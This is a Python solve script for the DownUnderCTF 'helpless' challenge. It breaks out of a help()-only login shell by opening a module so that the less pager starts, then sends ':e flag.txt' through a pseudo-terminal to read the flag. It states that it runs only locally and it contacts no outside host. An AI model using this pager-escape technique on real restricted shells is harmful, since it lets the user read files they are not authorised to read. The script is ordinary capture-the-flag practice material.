#!/usr/bin/env python3
"""Solve DownUnderCTF `helpless` -- a `help()`/`less` pager escape.

Recon: `helpless.py` is literally `help()`. The login shell is Python's
interactive help utility, so there is no normal command execution.

Clue: `help()` pages long module docs through the system pager (`less`). Open
a module (`os`) and `less` takes over; `less` has a file-open command,
`:e <path>`. Since you know the flag path, `:e flag.txt` loads it straight
into the pager -- "sometimes less is more".

The escape is interactive -- `less` only runs when it owns a real terminal --
so we drive it through a pseudo-terminal (`pty`) instead of a plain pipe. That
is the headless equivalent of sitting at the prompt and typing:

    help> os
    (less opens) :e flag.txt

Everything runs LOCALLY against the fetched copy; nothing remote is contacted.

Fetch first:  python challenges/fetch.py helpless
"""
import os
import pty
import re
import select
import time

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
SRC = os.path.join(REPO, "challenges", "helpless", "src")
HELPLESS = os.path.join(SRC, "helpless.py")


def drive() -> bytes:
    """Run helpless.py under a pty and perform the `os` -> `:e flag.txt` escape."""
    pid, fd = pty.fork()
    if pid == 0:  # child: become the jailed help() shell
        os.chdir(SRC)
        os.environ["PAGER"] = "less"
        os.environ["TERM"] = "xterm"
        os.execvp("python3", ["python3", HELPLESS])
    out = b""
    for keys, pause in [(b"os\r", 1.5), (b":e flag.txt\r", 1.5)]:
        time.sleep(pause)
        os.write(fd, keys)  # type at the help>/less prompt
    deadline = time.time() + 5
    while time.time() < deadline:
        ready, _, _ = select.select([fd], [], [], 0.4)
        if ready:
            try:
                chunk = os.read(fd, 4096)
            except OSError:
                break
            if not chunk:
                break
            out += chunk
            if b"DUCTF{" in out:
                break
    try:
        os.write(fd, b"q\rq\r")  # quit less, then quit help()
        os.close(fd)
    except OSError:
        pass
    return out.replace(b"\r", b"")


def main() -> None:
    raw = drive().decode("latin-1")
    match = re.search(r"DUCTF\{[^}]*\}", raw)
    print("FLAG:", match.group(0) if match else "not found")


if __name__ == "__main__":
    main()
